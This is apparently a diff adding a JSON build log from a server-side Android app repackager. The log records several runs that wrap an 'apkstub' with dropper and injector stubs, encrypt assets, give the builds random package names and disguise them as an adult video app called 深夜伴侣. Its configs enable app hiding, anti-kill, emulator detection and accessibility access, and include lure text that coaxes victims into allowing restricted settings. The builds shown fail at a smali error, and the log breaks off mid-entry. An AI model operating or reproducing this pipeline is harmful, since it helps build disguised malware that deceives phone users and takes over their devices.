@@ -1,0 +1,888 @@
+[
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "WORKER 参数初始化完成:\r\nMYID: 2C49FD883A012DDCD954CA09EE4E600B\r\nAppid: org.fetcher.scrubber.migrator\r\nUserid: 1\r\nClientName: 深夜伴侣\r\nEmail: YrIAU+Rfdz0JbXaf17JA6A==\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 深夜伴侣\r\nappversion: 3.1.2\r\nappicopath: ba4509737c197e608559531dcaa20669.png\r\nappurl: /rOVBkruR99k6UN9Oa8FvA==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 深夜伴侣视频温馨提醒\n因大陆网络受限制本次需要开启权限才能使用\n请仔细阅读使用步骤--\n1、点击下方确定--\n2、打开已下载服务（或应用）--\n3、点击深夜伴侣视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/a31c0418dca168a5e459db1fc42e4d3c.png\r\ninstalltype: g\r\nhidetype: k\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/1/icons/ba4509737c197e608559531dcaa20669.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/1/org.fetcher.scrubber.migrator"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": ">> Step1 Started.."
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": ">> Preparation Started.."
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-CMD] java -version"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] openjdk version \"11.0.30\" 2026-01-20"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] OpenJDK Runtime Environment (build 11.0.30+7-post-Ubuntu-1ubuntu122.04)"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": ">> Extract New Data.."
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": ">> Extract Apk Start.."
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-CMD] cd /tmp/Eaod_custom_wZHZaeYMNl"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-CMD] 7z x \"/tmp/Eaod_custom_wZHZaeYMNl/temp.zip\" -otemp"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] OpenJDK 64-Bit Server VM (build 11.0.30+7-post-Ubuntu-1ubuntu122.04, mixed mode, sharing)"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,64 bits,32 CPUs Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz (50657),ASM,AES-NI)"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] Scanning the drive for archives:"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] 1 file, 24377118 bytes (24 MiB)"
+  },
+  {
+    "Date": "04/01/2026 15:36:07",
+    "Content": "[DEBUG-SHELL] Extracting archive: /tmp/Eaod_custom_wZHZaeYMNl/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] --"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Path = /tmp/Eaod_custom_wZHZaeYMNl/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Type = zip"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Physical Size = 24377118"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Everything is Ok"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": ">> Extract Finish.."
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Folders: 883"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Files: 23442"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Size:       116239577"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG-SHELL] Compressed: 24377118"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": "[DEBUG] Waiting strings.xml: /tmp/Eaod_custom_wZHZaeYMNl/temp/res/values/strings.xml exists=True"
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": ">> Encoding Strings file..."
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": ">> Change ico..."
+  },
+  {
+    "Date": "04/01/2026 15:36:18",
+    "Content": ">> Change blackui..."
+  },
+  {
+    "Date": "04/01/2026 15:36:19",
+    "Content": "[DEBUG] Step2 permissions/strings/ico/blackui done"
+  },
+  {
+    "Date": "04/01/2026 15:36:19",
+    "Content": ">> Coding AndroidManifest..."
+  },
+  {
+    "Date": "04/01/2026 15:36:19",
+    "Content": "New apk PKG: com.force.stop.apps"
+  },
+  {
+    "Date": "04/01/2026 15:36:19",
+    "Content": ">> Updating Res files..."
+  },
+  {
+    "Date": "04/01/2026 15:36:20",
+    "Content": ">> Custom Step 3..."
+  },
+  {
+    "Date": "04/01/2026 15:36:20",
+    "Content": ">> Encryption..."
+  },
+  {
+    "Date": "04/01/2026 15:36:20",
+    "Content": ">> Encryption ALL..."
+  },
+  {
+    "Date": "04/01/2026 15:36:23",
+    "Content": ">> Skipping junk/shuffle (protection disabled)..."
+  },
+  {
+    "Date": "04/01/2026 15:36:23",
+    "Content": "Encrypt Assets:dwwzmwuqeeeuuty1"
+  },
+  {
+    "Date": "04/01/2026 15:36:24",
+    "Content": ">> Final placeholder sweep (all smali dirs)..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">> Sweep complete: 0 files patched."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">----------------->> Building Apk..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-CMD] java -Djdk.xml.entityExpansionLimit=0 -Djdk.xml.maxXMLNameLimit=0 -jar /tmp/Eaod_custom_wZHZaeYMNl/apktool.jar b -f /tmp/Eaod_custom_wZHZaeYMNl/temp -o /tmp/Eaod_custom_wZHZaeYMNl/out/Ready.apk"
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] [Fatal Error] :2:69: JAXP00010005: The length of entity \"http://schemas.android.com/apk/res/android\" is \"42\" that exceeds the \"0\" limit set by \"system property\"."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": "[DEBUG-SHELL] I: Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:36:25",
+    "Content": ">>  Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:36:29",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/ilwtwr.smali[144,21] Error for input '\"??????????': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:36:29",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/ilwtwr.smali[145,0] mismatched input '????????????????????' expecting STRING_LITERAL"
+  },
+  {
+    "Date": "04/01/2026 15:36:29",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/ilwtwr.smali[149,25] Error for input '%': Invalid text"
+  },
+  {
+    "Date": "04/01/2026 15:36:29",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/ilwtwr.smali[149,30] Error for input '\"': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] Exception in thread \"main\" brut.androlib.exceptions.AndrolibException: Could not smali file: com/icontrol/protector/ilwtwr.smali"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.src.SmaliBuilder.buildFile(SourceFile:74)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.buildSourcesSmaliJob(SourceFile:48)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.lambda$buildSourcesSmali$0(SourceFile:181)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)"
+  },
+  {
+    "Date": "04/01/2026 15:36:37",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.lang.Thread.run(Thread.java:829)"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "WORKER 参数初始化完成:\r\nMYID: 24B1DD64E9B69197BFB48ABCF496D29E\r\nAppid: com.explorer.harmonizer.listener\r\nUserid: 1\r\nClientName: 深夜伴侣\r\nEmail: YrIAU+Rfdz0JbXaf17JA6A==\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 深夜伴侣\r\nappversion: 5.7.7\r\nappicopath: ba4509737c197e608559531dcaa20669.png\r\nappurl: /rOVBkruR99k6UN9Oa8FvA==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 深夜伴侣视频温馨提醒\n因大陆网络受限制本次需要开启权限才能使用\n请仔细阅读使用步骤--\n1、点击下方确定--\n2、打开已下载服务（或应用）--\n3、点击深夜伴侣视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/a31c0418dca168a5e459db1fc42e4d3c.png\r\ninstalltype: g\r\nhidetype: k\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/1/icons/ba4509737c197e608559531dcaa20669.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/1/com.explorer.harmonizer.listener"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": ">> Step1 Started.."
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": ">> Preparation Started.."
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-CMD] java -version"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] openjdk version \"11.0.30\" 2026-01-20"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] OpenJDK Runtime Environment (build 11.0.30+7-post-Ubuntu-1ubuntu122.04)"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": ">> Extract New Data.."
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": ">> Extract Apk Start.."
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-CMD] cd /tmp/Eaod_custom_ZdJKUIlrFl"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-CMD] 7z x \"/tmp/Eaod_custom_ZdJKUIlrFl/temp.zip\" -otemp"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] OpenJDK 64-Bit Server VM (build 11.0.30+7-post-Ubuntu-1ubuntu122.04, mixed mode, sharing)"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,64 bits,32 CPUs Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz (50657),ASM,AES-NI)"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] Scanning the drive for archives:"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] 1 file, 24377118 bytes (24 MiB)"
+  },
+  {
+    "Date": "04/01/2026 15:42:42",
+    "Content": "[DEBUG-SHELL] Extracting archive: /tmp/Eaod_custom_ZdJKUIlrFl/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] --"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Path = /tmp/Eaod_custom_ZdJKUIlrFl/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Type = zip"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Physical Size = 24377118"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Everything is Ok"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": ">> Extract Finish.."
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Folders: 883"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Files: 23442"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG-SHELL] Size:       116239577"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": ">> Check Permissions..."
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG] TheApkPath=/tmp/Eaod_custom_ZdJKUIlrFl/temp"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG] Checking: /tmp/Eaod_custom_ZdJKUIlrFl/temp/AndroidManifest.xml"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG] File.Exists=True"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG] AndroidManifest found, reading..."
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": "[DEBUG] Waiting strings.xml: /tmp/Eaod_custom_ZdJKUIlrFl/temp/res/values/strings.xml exists=True"
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": ">> Encoding Strings file..."
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": ">> Change ico..."
+  },
+  {
+    "Date": "04/01/2026 15:42:53",
+    "Content": ">> Change blackui..."
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": "[DEBUG] Step2 permissions/strings/ico/blackui done"
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": ">> Coding AndroidManifest..."
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": "New apk PKG: nu.back.button"
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": ">> Updating Res files..."
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": ">> Custom Step 3..."
+  },
+  {
+    "Date": "04/01/2026 15:42:54",
+    "Content": ">> Encryption..."
+  },
+  {
+    "Date": "04/01/2026 15:42:56",
+    "Content": ">> Encryption ALL..."
+  },
+  {
+    "Date": "04/01/2026 15:43:06",
+    "Content": ">> Skipping junk/shuffle (protection disabled)..."
+  },
+  {
+    "Date": "04/01/2026 15:43:06",
+    "Content": "Encrypt Assets:iobvzcxrkakkh1"
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">> Final placeholder sweep (all smali dirs)..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">> Sweep complete: 0 files patched."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">----------------->> Building Apk..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-CMD] java -Djdk.xml.entityExpansionLimit=0 -Djdk.xml.maxXMLNameLimit=0 -jar /tmp/Eaod_custom_ZdJKUIlrFl/apktool.jar b -f /tmp/Eaod_custom_ZdJKUIlrFl/temp -o /tmp/Eaod_custom_ZdJKUIlrFl/out/Ready.apk"
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] [Fatal Error] :2:69: JAXP00010005: The length of entity \"http://schemas.android.com/apk/res/android\" is \"42\" that exceeds the \"0\" limit set by \"system property\"."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": "[DEBUG-SHELL] I: Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:43:08",
+    "Content": ">>  Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:43:14",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/wpapvnyvir.smali[144,21] Error for input '\"??????????': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:43:14",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/wpapvnyvir.smali[145,0] mismatched input '????????????????????' expecting STRING_LITERAL"
+  },
+  {
+    "Date": "04/01/2026 15:43:14",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/wpapvnyvir.smali[149,25] Error for input '%': Invalid text"
+  },
+  {
+    "Date": "04/01/2026 15:43:14",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/wpapvnyvir.smali[149,30] Error for input '\"': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] Exception in thread \"main\" brut.androlib.exceptions.AndrolibException: Could not smali file: com/icontrol/protector/wpapvnyvir.smali"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.src.SmaliBuilder.buildFile(SourceFile:74)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.buildSourcesSmaliJob(SourceFile:48)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.lambda$buildSourcesSmali$0(SourceFile:181)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)"
+  },
+  {
+    "Date": "04/01/2026 15:43:21",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.lang.Thread.run(Thread.java:829)"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "WORKER 参数初始化完成:\r\nMYID: FCB1D8D9B964DAA7128746D882A4AFDA\r\nAppid: com.watcher.gatekeeper.scheduler\r\nUserid: 1\r\nClientName: 深夜伴侣\r\nEmail: YrIAU+Rfdz0JbXaf17JA6A==\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 深夜伴侣\r\nappversion: 6.6.9\r\nappicopath: ba4509737c197e608559531dcaa20669.png\r\nappurl: /rOVBkruR99k6UN9Oa8FvA==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 深夜伴侣视频温馨提醒\n因大陆网络受限制本次需要开启权限才能使用\n请仔细阅读使用步骤--\n1、点击下方确定--\n2、打开已下载服务（或应用）--\n3、点击深夜伴侣视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/a31c0418dca168a5e459db1fc42e4d3c.png\r\ninstalltype: g\r\nhidetype: k\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/1/icons/ba4509737c197e608559531dcaa20669.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/1/com.watcher.gatekeeper.scheduler"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": ">> Step1 Started.."
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": ">> Preparation Started.."
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-CMD] java -version"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] openjdk version \"11.0.30\" 2026-01-20"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] OpenJDK Runtime Environment (build 11.0.30+7-post-Ubuntu-1ubuntu122.04)"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": ">> Extract New Data.."
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": ">> Extract Apk Start.."
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-CMD] cd /tmp/Eaod_custom_cDwyuuytTh"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-CMD] 7z x \"/tmp/Eaod_custom_cDwyuuytTh/temp.zip\" -otemp"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] OpenJDK 64-Bit Server VM (build 11.0.30+7-post-Ubuntu-1ubuntu122.04, mixed mode, sharing)"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,64 bits,32 CPUs Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz (50657),ASM,AES-NI)"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] Scanning the drive for archives:"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] 1 file, 24377118 bytes (24 MiB)"
+  },
+  {
+    "Date": "04/01/2026 15:52:55",
+    "Content": "[DEBUG-SHELL] Extracting archive: /tmp/Eaod_custom_cDwyuuytTh/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] --"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Path = /tmp/Eaod_custom_cDwyuuytTh/temp.zip"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Type = zip"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Physical Size = 24377118"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Everything is Ok"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": ">> Extract Finish.."
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Folders: 883"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG-SHELL] Files: 23442"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": ">> Check Permissions..."
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
